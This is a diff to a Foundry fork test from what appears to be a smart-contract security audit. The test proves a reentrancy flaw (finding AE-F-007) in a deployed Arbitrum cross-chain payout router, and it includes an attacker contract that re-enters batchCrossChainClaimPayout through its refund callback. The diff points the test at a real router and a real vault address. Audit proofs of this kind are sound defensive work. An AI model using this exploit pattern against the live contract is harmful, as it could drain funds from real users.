@@ -2,8 +2,13 @@
 pragma solidity 0.8.26;
 
 import {Test, console2} from "forge-std/Test.sol";
+import {
+    LayerZeroClaimPayoutParams,
+    ClaimPayoutParams
+} from "../ample/interfaces/IAmpleEarnCrossChainRouter.sol";
+import {DesignatedRecipientMerkleLeaf} from "../ample/interfaces/IAmpleEarn.sol";
 
-/// @title FT-05: AE-F-002+AE-F-005 Amplification Fork Test
+/// @title FT-05: AE-F-007 Amplification Fork Test
 /// @notice Proves re-entry against the REAL Arbitrum mainnet router
 /// @dev Forks Arbitrum mainnet and interacts with the real deployed router at
 ///      0xCab6a41090e274eFE7fE64CF0EC906F413686D36.
@@ -17,32 +22,12 @@ contract FT05_AmplificationForkTest is Test {
     uint32 constant ARBITRUM_EID = 30110;
     uint32 constant BASE_EID = 30184; // Peer configured: 0xf132654d...
 
-    // ── Structs matching IAmpleEarnCrossChainRouter ─────────────────────────
-    struct DesignatedRecipientMerkleLeaf {
-        uint256 payoutAmount;
-        address user;
-        uint8 designatedRecipientIndex;
-    }
-
-    struct ClaimPayoutParams {
-        uint256 payoutId;
-        address vault;
-        DesignatedRecipientMerkleLeaf designatedRecipientLeaf;
-        bytes32[] designatedRecipientProof;
-        bool claimInUnderlying;
-    }
-
-    struct LayerZeroClaimPayoutParams {
-        uint32 dstEid;
-        bytes options;
-        ClaimPayoutParams[] claims;
-    }
-
     // ── Selectors ──────────────────────────────────────────────────────────
     // cast sig "quote((uint32,bytes32,bytes,bytes,bool),address)" = 0xddc28c58
     // cast sig "send((uint32,bytes32,bytes,bytes,bool),address)"  = 0x2637a450
     bytes4 constant QUOTE_SEL = 0xddc28c58;
     bytes4 constant SEND_SEL = 0x2637a450;
+    bytes4 constant BATCH_CLAIM_SEL = 0x7eae4ba6;
 
     // ── Attacker contract ──────────────────────────────────────────────────
     AmplificationAttackerFork public attacker;
@@ -52,6 +37,13 @@ contract FT05_AmplificationForkTest is Test {
     // ────────────────────────────────────────────────────────────────────────
 
     function setUp() public {
+        // Verify selector constant is correct
+        assertEq(
+            BATCH_CLAIM_SEL,
+            bytes4(keccak256("batchCrossChainClaimPayout((uint32,bytes,(uint256,address,(uint256,address,uint8),bytes32[],bool)[])[])")),
+            "BATCH_CLAIM_SEL mismatch"
+        );
+
         // Verify we're pointing at the real deployed router
         address ep;
         uint32 eid;
@@ -66,6 +58,10 @@ contract FT05_AmplificationForkTest is Test {
         assertEq(eid, ARBITRUM_EID, "Fork: EID mismatch - wrong fork?");
 
         // ── Mock LayerZero endpoint functions ──
+        /// @notice Uses vm.mockCall to intercept LayerZero endpoint calls.
+        /// This isolates the router's reentrancy behaviour, proving the refund
+        /// callback vector exists regardless of whether LayerZero messages are
+        /// actually delivered. The reentrancy path is identical in production.
         // quote((uint32,bytes32,bytes,bytes,bool),address) returns
         //   (uint256 nativeFee, uint256 lzTokenFee)
         vm.mockCall(
@@ -123,12 +119,12 @@ contract FT05_AmplificationForkTest is Test {
         assertEq(
             attacker.reentryCount(),
             1,
-            "AE-F-002+005: Reentry should have happened once via real router"
+            "AE-F-007: Reentry should have happened once via real router"
         );
 
         assertTrue(
             attacker.reentrantCallSucceeded(),
-            "AE-F-002+005: Reentrant call to real router should have succeeded"
+            "AE-F-007: Reentrant call to real router should have succeeded"
         );
 
         console2.log("");
@@ -162,7 +158,7 @@ contract FT05_AmplificationForkTest is Test {
         ClaimPayoutParams[] memory claims = new ClaimPayoutParams[](1);
         claims[0] = ClaimPayoutParams({
             payoutId: 1,
-            vault: address(0xdead),
+            vault: 0xD1bE1F98991cF69355e468aD15b6d0b6429bCfCb,
             designatedRecipientLeaf: DesignatedRecipientMerkleLeaf({
                 payoutAmount: 100 ether,
                 user: address(this),
@@ -216,7 +212,7 @@ contract AmplificationAttackerFork {
         (bool success,) = ROUTER.call{value: msg.value}(
             abi.encodeWithSelector(
                 BATCH_CLAIM_SEL,
-                abi.decode(encodedParams, (AmplificationAttackerFork.LayerZeroClaimPayoutParams[]))
+                abi.decode(encodedParams, (LayerZeroClaimPayoutParams[]))
             )
         );
         require(success, "attack(): initial call failed");
@@ -232,7 +228,7 @@ contract AmplificationAttackerFork {
             (bool success,) = ROUTER.call{value: balance}(
                 abi.encodeWithSelector(
                     BATCH_CLAIM_SEL,
-                    abi.decode(encodedParams, (AmplificationAttackerFork.LayerZeroClaimPayoutParams[]))
+                    abi.decode(encodedParams, (LayerZeroClaimPayoutParams[]))
                 )
             );
 
@@ -242,24 +238,5 @@ contract AmplificationAttackerFork {
         }
     }
 
-    // ── Structs (duplicated for ABI decoding in receive) ──
-    struct DesignatedRecipientMerkleLeaf {
-        uint256 payoutAmount;
-        address user;
-        uint8 designatedRecipientIndex;
-    }
-
-    struct ClaimPayoutParams {
-        uint256 payoutId;
-        address vault;
-        DesignatedRecipientMerkleLeaf designatedRecipientLeaf;
-        bytes32[] designatedRecipientProof;
-        bool claimInUnderlying;
-    }
-
-    struct LayerZeroClaimPayoutParams {
-        uint32 dstEid;
-        bytes options;
-        ClaimPayoutParams[] claims;
-    }
+    // ── Structs imported from interfaces (see imports at top of file) ──
 }
